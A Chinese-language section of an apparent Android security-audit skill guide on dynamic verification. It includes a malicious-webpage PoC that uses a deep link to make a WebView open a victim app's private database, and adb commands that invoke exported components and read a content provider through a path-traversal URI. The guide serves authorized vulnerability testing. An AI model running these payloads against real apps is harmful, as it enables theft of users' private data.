# 四、动态验证

> 来源：CkSKILLS v1 `android-security-audit` §四、动态验证（迁移至 v2 知识块）

**验证原则**：发现漏洞后必须立即验证。**优先尝试远程利用方式**，若远程验证不成功或不适用，再尝试本地利用方式。

### 4.1 远程利用验证（优先级 1）

针对导出的 Activity（配置了 Scheme/Host）或 WebView 存在跨域/JS 漏洞：

```html
<!-- 恶意网页 PoC：发送到目标手机，浏览器打开 -->
<a href="myapp://path?param=payload">点击触发 Deep Link</a>
<script>location.href = "myapp://webview?url=file:///data/data/com.victim/databases/private.db";</script>
```

其他远程方式：检查是否可通过特定格式的短信/邮件内容触发漏洞。

### 4.2 本地利用验证（优先级 2）

```bash
adb shell am start -n com.victim/.ExportedActivity --es key value --ei intKey 1

adb shell am startservice -n com.victim/.ExportedService

adb shell am broadcast -a com.victim.ACTION --ei state 3

adb shell content query --uri content://com.victim.provider/path

adb shell content read --uri "content://com.victim.provider/../../../data/data/com.victim/databases/private.db"
```

- 先用 ADB 快速验证，确认漏洞后再构建 PoC APK（见 四）提升报告质量。
- **纯 ADB 验证的漏洞评级不会高于"本地"级别**。若漏洞可通过恶意 App 利用，务必补充 PoC APK 争取更高评级。

### 4.3 合规越权验证

- 记录申请能力与业务声明（权限用途说明、白名单/VoIP 申请理由）。
- 触发实际场景并取证（后台/前台状态、用户是否可感知、消息内容类型）。
- 输出双结论：`安全影响` + `平台合规风险`，避免误判为纯技术漏洞或纯运营问题。

---
